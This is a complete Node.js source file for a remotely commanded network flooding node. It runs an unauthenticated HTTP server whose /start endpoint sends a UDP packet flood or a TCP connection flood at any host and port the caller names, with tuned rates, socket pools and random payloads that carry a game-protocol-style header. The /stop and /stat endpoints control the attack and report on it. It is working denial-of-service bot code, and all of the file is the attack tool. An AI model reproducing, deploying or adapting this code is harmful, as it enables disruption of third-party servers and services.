const http = require('http');
const dns = require('dns');
const dgram = require('dgram');
const net = require('net');
const crypto = require('crypto');

const PORT = Number(process.env.PORT || process.env.SERVER_PORT || 3000);
const MAX_RATE = Number(process.env.MAX_PPS || 60000);
const NSOCK = 12;
const CONC = Number(process.env.CONC || 1200);

const st = { run: false, sent: 0, t0: 0, dur: 1, proto: 'tcp' };
let socks = [], timer = null;

const cors = r => {
  r.setHeader('Access-Control-Allow-Origin', '*');
  r.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
};
const js = (r, c, o) => {
  cors(r); r.writeHead(c, { 'content-type': 'application/json' }); r.end(JSON.stringify(o));
};

function payload(n) {
  const b = crypto.randomBytes(n);
  if (n >= 8) {
    b.writeUIntBE(n - 3, 0, 3);
    b[3] = 0; b[4] = 0; b.writeUInt16BE(10101, 5);
  }
  return b;
}

function stop() {
  clearInterval(timer); timer = null;
  st.run = false;
  const old = socks; socks = [];
  for (const s of old) { try { s.close(); } catch {} }
}

function startUdp(ip, port, pps, dur) {
  stop();
  st.proto = 'udp';

  const pool = [];
  for (let i = 0; i < 128; i++) pool.push(payload(1400));
  const N = pool.length;

  for (let i = 0; i < NSOCK; i++) {
    const s = dgram.createSocket({ type: 'udp4', sendBufferSize: 32 << 20 });
    s.on('error', () => {});
    s.bind(0, () => { try { s.setSendBufferSize(32 << 20); } catch {} });
    socks.push(s);
  }

  st.run = true; st.sent = 0; st.t0 = Date.now(); st.dur = dur;
  const t0 = process.hrtime.bigint();
  const my = socks;
  let si = 0, pi = 0;

  function loop() {
    if (!st.run) return;
    const el = Number(process.hrtime.bigint() - t0) / 1e6;
    let burst = Math.floor(pps * el / 1000) - st.sent;
    if (burst > 4000) burst = 4000;
    for (let i = 0; i < burst; i++) {
      my[si++ % my.length].send(pool[pi++ % N], port, ip);
    }
    st.sent += burst;
    if (el >= dur * 1000) return stop();
    setImmediate(loop);
  }
  loop();
}

function startTcp(ip, port, dur) {
  stop();
  st.proto = 'tcp';

  st.run = true; st.sent = 0; st.t0 = Date.now(); st.dur = dur;
  const PAY = payload(256);
  const t0 = Date.now();
  let active = 0;

  function one() {
    if (!st.run || active >= CONC) return;
    active++;
    const s = net.connect(port, ip);
    s.setNoDelay(true);
    s.on('connect', () => {
      st.sent++;
      s.write(PAY);
      s.destroy();
    });
    s.on('error', () => {});
    s.on('close', () => { active--; });
  }

  function pump() {
    if (!st.run) return;
    for (let i = 0; i < 64 && active < CONC; i++) one();
    if (Date.now() - t0 >= dur * 1000) return stop();
    setImmediate(pump);
  }
  pump();
}

http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  if (req.method === 'OPTIONS') { cors(res); res.writeHead(204); return res.end(); }

  if (u.pathname === '/health') return js(res, 200, { ok: true });

  if (u.pathname === '/') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    return res.end('<h3>node ok</h3><p>maxpps=' + MAX_RATE +
      '</p><p><a href="/stat">/stat</a></p>');
  }

  if (u.pathname === '/start') {
    const raw = u.searchParams.get('ip');
    if (!raw) return js(res, 400, { error: 'ip required' });
    const port = Math.min(Math.max(Number(u.searchParams.get('port') || 80), 1), 65535);
    const dur  = Math.min(Math.max(Number(u.searchParams.get('dur')  || 15), 1), 300);
    const pps  = Math.min(Math.max(Number(u.searchParams.get('pps')  || 4000), 100), MAX_RATE);
    const proto = (u.searchParams.get('proto') || 'tcp').toLowerCase();
    dns.lookup(raw, (e, a) => {
      const ip = e ? raw : a;
      if (proto === 'udp') startUdp(ip, port, pps, dur);
      else startTcp(ip, port, dur);
      js(res, 200, { ok: true, port, pps, dur, proto });
    });
    return;
  }

  if (u.pathname === '/stop') { stop(); return js(res, 200, { ok: true }); }

  if (u.pathname === '/stat') {
    const el = Math.min((Date.now() - st.t0) / 1000, st.dur);
    const pps = el > 0 ? Math.round(st.sent / el) : 0;
    return js(res, 200, {
      running: st.run, proto: st.proto, sent: st.sent, elapsed: Math.floor(el),
      pps, mbps: +(pps * 256 * 8 / 1e6).toFixed(1),
    });
  }

  js(res, 404, { error: 'nf' });
}).listen(PORT, () => console.log('listening on ' + PORT));
